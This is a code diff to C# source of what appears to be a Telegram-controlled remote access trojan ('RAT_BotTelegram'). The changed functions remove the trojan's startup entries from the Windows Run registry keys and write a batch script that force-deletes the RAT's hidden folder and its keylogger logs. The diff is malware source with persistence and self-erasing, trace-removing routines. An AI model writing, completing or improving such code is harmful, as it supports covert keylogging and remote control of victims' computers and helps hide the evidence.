@@ -1,9 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.ComponentModel;
-using static System.Net.Mime.MediaTypeNames;
-
 namespace RAT_BotTelegram.Lib {
     internal sealed class Tools {
 
@@ -147,14 +144,12 @@ namespace RAT_BotTelegram.Lib {
 
                 try {
                     Console.WriteLine("\n[StartUp] Eliminando registros de arranque...\n");
+
                     RegistryTools R = new RegistryTools();
                     const string PathA = @"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-                    if (R.DeleteKey(PathA) != "E#RR04") {
-                        Console.WriteLine("[StartUp] Se eliminó del registro");
-                    } else {
-                        const string Path = @"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-                        Console.WriteLine("[StartUp] Se eliminó del registro = " + R.DeleteKey(Path));
-                    }
+                    Console.WriteLine("[StartUp] Se eliminó del registro = " + R.DeleteValue(PathA, config.NAME_REG));
+                    const string Path = @"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                    Console.WriteLine("[StartUp] Se eliminó del registro = " + R.DeleteValue(Path, config.NAME_REG));
 
                 } catch {
                     Console.WriteLine("Error al eliminar del registro");
@@ -166,14 +161,12 @@ namespace RAT_BotTelegram.Lib {
                 // Actualiza bat
                 try {
                     File.Delete(pathbat);
-
                 } catch {
                 }
 
                 const string bat =    // Bat que borrará el RAT 
                            "@echo off\n" +
                            @"cd " + config.PATH_OCUL + "\n" + // Ruta del RAT
-                           @"timeout /t 1 /NOBREAK >null" + "\n" +
                            @"timeout /t 1 /NOBREAK >null" + "\n" +
                            @"del /f /q /S *.*" + "\n" +
                            @"cd " + config.PATH_LOG + "\n" +  // Ruta del Keylogger
